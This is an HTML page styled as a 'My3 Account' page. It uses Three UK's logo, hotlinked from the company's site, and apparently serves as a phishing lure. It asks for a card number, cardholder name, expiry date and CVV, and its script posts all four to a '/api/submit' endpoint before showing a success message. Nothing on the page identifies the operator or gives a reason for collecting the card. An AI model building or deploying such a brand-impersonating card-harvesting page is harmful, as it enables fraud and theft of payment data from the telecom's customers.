<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>My3 Account</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 50px;
      background-color: #f9f9f9;
      text-align: center; /* Center align all content */
    }

    .logo-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }

    .logo-img {
      width: 115px;
      height: 115px;
    }

    .logo-text {
      font-size: 36px;
      font-weight: bold;
      color: #000;
      margin-top: 10px;
    }

    form {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
      border: 1px solid #ccc;
      border-radius: 10px;
      background-color: white;
      text-align: left;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <!-- Logo Container -->
  <div class="logo-container">
    <img 
      src="https://www.three.co.uk/content/dam/threedigital/three-logo.svg " 
      alt="Three Logo" 
      class="logo-img" />

    <div class="logo-text">
      My3 Account
    </div>
  </div>

  <!-- Card Details Form -->
  <form id="cardForm">
    <label for="cardNumber">Card Number:</label>
    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>

    <label for="nameOnCard">Name on Card:</label>
    <input type="text" id="nameOnCard" name="nameOnCard" placeholder="John Doe" required>

    <label for="expiryDate">Expiry Date:</label>
    <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>

    <label for="cvv">CVV:</label>
    <input type="password" id="cvv" name="cvv" placeholder="123" required>

    <button type="submit">Submit</button>
  </form>

  <script>
    document.getElementById('cardForm').addEventListener('submit', async function (e) {
      e.preventDefault();
      const cardNumber = document.getElementById('cardNumber').value;
      const nameOnCard = document.getElementById('nameOnCard').value;
      const expiryDate = document.getElementById('expiryDate').value;
      const cvv = document.getElementById('cvv').value;

      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cardNumber, nameOnCard, expiryDate, cvv }),
      });

      if (response.ok) {
        alert('Card details submitted successfully!');
      } else {
        alert('Failed to submit card details.');
      }
    });
  </script>
</body>
</html>
